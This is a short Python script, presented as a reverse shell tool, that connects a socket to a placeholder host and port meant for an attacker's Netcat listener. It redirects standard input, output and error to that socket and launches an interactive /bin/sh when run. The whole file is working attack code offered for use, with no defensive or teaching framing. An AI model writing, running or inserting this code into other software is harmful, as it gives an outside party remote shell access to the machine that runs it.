#!/usr/bin/env python

"""
 * reverseshell
 * reverseshell is a all in one reverseshell tool
 *
 * @Developed By karthithehacker <https://karthithehacker.com>
 */


"""


import socket
import subprocess
import os

def reverse_shell():
    host = '127.0.0.1'  # Replace with your IP address
    port = 4444  # Replace with the port number you used in the Netcat listener
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    os.dup2(s.fileno(), 0)  # Redirect stdin
    os.dup2(s.fileno(), 1)  # Redirect stdout
    os.dup2(s.fileno(), 2)  # Redirect stderr

    subprocess.call(['/bin/sh', '-i'])

reverse_shell()

